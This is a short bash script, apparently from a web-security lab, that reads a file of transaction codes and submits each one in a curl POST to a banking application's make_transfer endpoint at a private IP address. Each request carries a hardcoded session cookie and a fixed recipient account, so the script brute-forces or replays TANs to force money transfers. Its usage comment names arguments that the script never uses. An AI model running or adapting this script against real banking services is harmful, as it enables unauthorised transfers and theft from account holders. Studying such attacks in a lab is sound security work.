#!/bin/bash
# usage: bomb_transaction.sh tans.txt [sessionid] [recipient] [amount]
while IFS='' read -r line || [[ -n "$line" ]]; do
    curl 'http://192.168.57.101/make_transfer' \
-H 'Pragma: no-cache' \
-H 'Origin: http://192.168.57.101' \
-H 'Accept-Encoding: gzip, deflate' \
-H 'Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Cache-Control: no-cache' \
-H 'Referer: http://192.168.57.101/make_transfer' \
-H 'Cookie: Main_session=m8vier6lm8siic8akjvmnjb8g5' \
-H 'Connection: keep-alive' --data "make_transfer%5Bto_account_id%5D=1496518592&make_transfer%5Bto_account_name%5D=Test&make_transfer%5Bamount%5D=1&make_transfer%5Btransaction_code%5D=$line&make_transfer%5Bremarks%5D=test" --compressed
done < "$1"